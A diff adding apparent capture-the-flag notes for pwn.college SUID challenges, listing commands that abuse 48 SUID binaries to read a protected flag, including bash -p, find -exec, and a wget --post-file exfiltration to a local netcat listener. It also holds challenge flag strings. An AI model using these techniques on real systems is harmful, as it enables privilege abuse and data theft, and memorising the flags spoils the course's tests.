@@ -1,0 +1,194 @@
+### IF SUID ###
+
+# 1. more
+# more flag
+
+# 2. less 
+# # less flag
+
+# 3. tail 
+# tail flag
+
+# 4. head
+# head flag
+
+# 5. sort
+# # sort flag
+
+# 6. vim
+# vim flag
+
+# 7. emacs
+# emacs flag
+
+# 8. nano 
+# nano flag
+
+# 9. rev
+# # rev flag
+# echo "flag" > outfile
+# rev outfile
+
+# 10. od
+# od -tc flag
+
+# 11. hd
+# hd flag
+
+# 12. xxd
+# xxd flag
+
+# 13. base32
+# echo "OB3W4LTDN5WGYZLHMV5XOVT2LJHW2MTHKR3HALLPOF3EGUTVLFZFOTSNGRZUIXZOGBWE4MKFIRGDKVL2JV3UK6SXPUFA====" | base32 -d
+
+# 14. base64
+# base64 flag
+# echo "cHduLmNvbGxlZ2V7TU5MdnNpNGNJazhieWdGZjZEZHFtbHZvOE9DLjAxTjFFREw1VXpNd0V6V30K" | base64 -d
+
+# 15. split
+# split flag
+# cat 0xaa
+
+# 16. gzip
+# gzip flag
+# man gzip
+# zcat flag.gzip
+
+# 17. bzip2
+# bzip2 -d -c flag.bz2
+
+# 18. unzip
+# unzip -hh | grep "output"
+# unzip -p flag
+
+# 19. tar
+# tar -cf flag.tar flag
+# cat flag.tar
+
+# 20. ar
+# ar r flag.gzip flag
+
+
+# 21. cpio
+# cpio -idv < /tmp/flag.cpio 
+# Solution: <---  "cat /tmp/flag.cpio"
+
+# 22. genisoimage
+# genisoimage -file-mode 4777 -o /tmp/flag.iso -sort flag
+
+# 23. env
+# env (noticed any variables used as commands)
+# env less flag
+
+# 24. find 
+# find /flag -exec cat {} \;
+# NOTE: the "-exec" parameter is the vulnerability
+
+# 25. make
+# - create a makefile in /tmp dir ("Makefile")
+# makefile contents -- 
+###
+all: 
+	cat ../flag 
+###
+# - run 'Makefile'
+# sources -- https://makefiletutorial.com/#command-execution
+
+# 26. nice 
+# nice -n -3 cat flag
+
+# 27. timeout
+# timeout 1.1m cat flag
+# source --  https://linuxize.com/post/timeout-command-in-linux/
+
+# 28. stdbuf
+# stdbuf -o L cat flag
+
+# 29. setarch
+# setarch --addr-no-randomize cat flag
+
+# 30. watch
+# # watch -x cat flag
+
+# 31. socat
+# socat STDIO FILE:/flag
+# source -- www.dest-unreach.org
+# source -- https://techsquad.rocks/blog/cat_and_friends_netcat_socat/
+# source -- https://www.poftut.com/linux-multipurpose-relay-socat-command-tutorial-with-examples/
+
+# 32. whiptail
+# whiptail --textbox ../flag 20 20
+# note --> whiptail -- textbox <hgt> <wgt> <-- man whiptail
+
+# 33. awk
+# # awk '{ system("cat " $1) }' flag
+
+# 34. sed
+# sed G flag
+
+# 35. ed
+###
+ed -s flag << EOF
+> 1, $p
+> q
+> EOF
+###
+# note -- # ChatGPT
+
+# 36. chown
+# chown <user> <flag>
+# cat flag
+
+# 37. chmod 
+# chmod a+r flag
+# cat flag
+
+# 38. cp
+# cp --no-preserve=mode,ownership flag flagcp
+# note -- cp has a very nice flag --no-preserve=
+
+# 39. mv
+# mv <file> <dir>
+# note -- With the mv tool, you will need to mv the file to a directory where the SUID bit is set for another tool that can read a file
+
+# 40. perl
+# perl ./perlScript.pl ../flag 
+# perl scriptp to read a file
+
+# 41. python
+# python3 <pyFile.py>
+# python script to read file
+
+# 42. ruby
+# ruby readFile.rb flag
+# ruby script that reads a file
+
+# 43. /bin/*
+# options=[[sh -p], [bash -p], [python -p], [cat -p], etc.]
+# # *bin/* -p command disables command injection mitigations
+
+# 44. date
+# date --file flag
+# the error message is the vulnerability
+# outputs "date: invalid date ‘<contents-of-file>’"
+
+# 45. dmesg
+# dmesg --file flag
+
+# 46. wc
+# wc --files0-from=flag
+
+# 47. gcc
+# gcc -x c++ flag
+# Gcc doesn't recognize the format, so it treats it as a linker file. In order to make it give you an error showing the line that caused the error, you can force it to treat the file as if it were written in a certain language. Look for the -x option in help or man page
+
+# 48. as
+# as flag
+# the error message is the vulnerability
+# the assembler does not recognize the file as an as file and outputs warning with the file contents being referenced and displayed
+# output=flag: Assembler messages: flag:1: Error: no such instruction: `pwn.college{0xgE-6ZY8l_DYg--Or9pOn9-7vP.0VM5EDL5UzMwEzW}'
+
+# wget
+# nc -lp 80 
+# wget --post-file=flag 127.0.0.1
+# note -- nc must be available to run this command and get the returned value
